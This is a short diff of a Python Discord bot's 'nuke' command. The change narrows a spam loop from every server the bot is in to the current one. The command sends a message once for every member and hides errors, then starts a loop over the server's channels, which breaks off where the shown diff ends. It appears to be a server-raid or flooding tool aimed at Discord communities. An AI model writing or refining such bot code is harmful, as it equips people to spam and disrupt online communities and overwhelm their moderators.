@@ -12,12 +12,12 @@ bot = commands.Bot(command_prefix = settings['prefix'])
 @bot.command()
 async def nuke (ctx):
     
-    for gild in bot.guilds:
-        for i in gild.members:
-            try:
-                await ctx.send ("ОР")
-            except:
-                print ("oops")
+    
+    for i in ctx.guild.members:
+        try:
+            await ctx.send ("ORU")
+        except:
+            print ("oops")
     for j in ctx.guild.channels:
         
         try:
